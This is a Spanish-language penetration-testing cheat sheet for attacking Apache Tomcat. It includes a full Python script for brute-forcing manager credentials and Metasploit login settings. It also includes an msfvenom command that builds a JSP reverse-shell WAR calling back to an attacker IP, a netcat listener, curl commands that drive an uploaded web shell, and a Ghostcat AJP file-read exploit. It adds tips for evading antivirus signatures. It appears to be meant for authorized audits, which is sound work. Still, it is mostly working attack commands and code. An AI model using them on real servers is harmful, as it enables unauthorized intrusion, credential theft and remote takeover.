---
tags:
  - webapp
  - tomcat
  - attack
---
## Conceptos Clave (TL;DR)
* El acceso a los endpoints `/manager` o `/host-manager` generalmente permite lograr Ejecución Remota de Código (RCE) en el servidor.
* La autenticación en Tomcat suele utilizar Basic Auth, la cual codifica las credenciales en formato Base64.
* Con credenciales válidas del rol `manager-gui`, se pueden subir aplicaciones empaquetadas (archivos `.WAR`) que contengan web shells maliciosas en JSP.
* CVE-2020-1938 (Ghostcat) es una vulnerabilidad de LFI no autenticada causada por una mala configuración en el protocolo AJP (Apache Jserv Protocol), típicamente expuesto en el puerto 8009.

## Herramientas Clave
* **Metasploit (`tomcat_mgr_login` / `tomcat_mgr_upload`)**: Automatiza ataques de fuerza bruta y la subida de archivos WAR.
* **Burp Suite / ZAP**: Útil para interceptar tráfico, hacer troubleshooting de herramientas automatizadas y verificar encabezados de autorización.
* **zip**: Utilidad nativa para empaquetar código JSP dentro de un archivo WAR válido.
* **msfvenom**: Genera archivos WAR automatizados que contienen payloads de reverse shell en Java/JSP.
* **Python / cURL**: Para ejecutar scripts de fuerza bruta personalizados y para interactuar remotamente con las web shells vía línea de comandos.

## Metodología Paso a Paso
1. **Fuerza Bruta al Manager**: Utiliza Metasploit, scripts en Python o Burp Intruder para adivinar credenciales por defecto contra el endpoint `/manager/html`. Tomcat cuenta con pares de credenciales predeterminados (ej. `tomcat:admin`) que suelen ser válidos.
2. **Creación del Payload (WAR)**: Una vez obtenidas las credenciales, crea una web shell en JSP y empaquétala como un archivo `.WAR` utilizando `zip`, o genera el payload directamente con `msfvenom`.
3. **Despliegue (Deploy)**: Accede al Tomcat Web Application Manager, selecciona el archivo WAR y haz clic en "Deploy". Tomcat extraerá automáticamente el contenido y creará un directorio para la aplicación.
4. **Ejecución de Código**: Navega al directorio de la aplicación desplegada apuntando al archivo JSP (ej. `/backup/cmd.jsp`) o interactúa vía `cURL` para ejecutar comandos.
5. **Explotación AJP (Ghostcat)**: Alternativamente, si el puerto 8009 está abierto, utiliza un script de prueba de concepto (PoC) para explotar el protocolo AJP y leer archivos sensibles de la aplicación.

## Cheat Sheet de Comandos

```bash
# Escaneo de servicios HTTP y AJP en Tomcat
nmap -sV -p <TARGET_PORT_AJP>,<TARGET_PORT_HTTP> <TARGET_IP>
```

```bash
# Configuración de Metasploit para fuerza bruta a Tomcat Manager
# Requiere configurar VHOST, RPORT, RHOSTS y definir STOP_ON_SUCCESS para evitar ruido
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST <TARGET_DOMAIN>
set RPORT <TARGET_PORT>
set RHOSTS <TARGET_IP>
set STOP_ON_SUCCESS true
run
```

```bash
# Configuración de Proxy en Metasploit para troubleshooting de módulos
# Permite ver las peticiones exactas en Burp Suite o ZAP
set PROXIES HTTP:127.0.0.1:8080
```

```bash
# Decodificar credenciales Basic Auth interceptadas (Base64)
echo <BASE64_STRING> | base64 -d
```

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

```bash
# Script de Python para fuerza bruta de Tomcat Manager
# Requiere listas de usuarios y contraseñas
python3 mgr_brute.py -U http://<TARGET_IP>:<TARGET_PORT>/ -P /manager -u <USERS_FILE_PATH> -p <PASSWORDS_FILE_PATH>
```

```bash
# Empaquetar una web shell JSP existente en un archivo WAR
# -r indica recursión para empaquetar el archivo dentro del contenedor .war
zip -r <APP_NAME>.war <WEBSHELL_NAME>.jsp
```

```bash
# Interactuar con la web shell JSP subida usando cURL
# Pasa el comando al parámetro correspondiente (ej. 'cmd')
curl http://<TARGET_DOMAIN>:<TARGET_PORT>/<APP_NAME>/<WEBSHELL_NAME>.jsp?cmd=id
```

```bash
# Generar un archivo WAR con reverse shell usando msfvenom
# Utiliza el payload de Java/JSP para ejecución de shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f war > <APP_NAME>.war
```

```bash
# Listener de Netcat para recibir la conexión de la reverse shell
nc -lnvp <ATTACKER_PORT>
```

```bash
# Explotación de Ghostcat (LFI vía AJP)
# Intenta leer web.xml u otros archivos dentro del directorio WEB-INF
python2.7 tomcat-ajp.lfi.py <TARGET_DOMAIN_OR_IP> -p <TARGET_PORT_AJP> -f WEB-INF/web.xml
```

## "Gotchas" y Troubleshooting
* **Troubleshooting de Herramientas**: Si un escáner como Metasploit falla, envía el tráfico a través de Burp Suite (`set PROXIES`) para verificar que la codificación Base64 de las credenciales se esté aplicando y enviando correctamente.
* **Rutas de la Web Shell**: Al hacer clic en la aplicación desplegada desde el manager, arrojará un error 404; es obligatorio especificar manualmente el nombre del archivo JSP en la URL (ej. de `/backup/` a `/backup/cmd.jsp`).
* **Evasión de Antivirus**: Las web shells comunes (ej. el payload predeterminado de msfvenom o shells JSP públicas) pueden ser detectadas. Modificar ligeramente variables o cadenas de texto en el código (ej. cambiar "Uploaded:" a "uPlOaDeD:") ayuda a evadir firmas de detección estática.
* **Limitación de Ghostcat**: El ataque de LFI mediante Ghostcat **solo** permite leer archivos y carpetas dentro del directorio de aplicaciones web; no puede acceder a archivos externos del sistema operativo como `/etc/passwd`.
* **Limpieza (Clean-up)**: Tras la intrusión, anota la ruta de la aplicación para el reporte (ej. `/opt/tomcat/apache-tomcat-x.x/webapps`) y utiliza el botón "Undeploy" en el Manager GUI para eliminar automáticamente el archivo `.WAR` y su directorio asociado.
* **Protección de Web Shells Propias**: Para evitar que otros actores maliciosos utilicen tus web shells durante una auditoría, ofúscalas con nombres aleatorios (ej. un hash MD5), restringe el acceso a tu IP de atacante, o impleméntales protección con contraseña.
* **Privilegios Elevados**: Tomcat frecuentemente se ejecuta bajo usuarios de altos privilegios (`SYSTEM` en Windows o `root` en Linux), lo que lo convierte en un vector excelente para obtener control total del servidor de forma directa.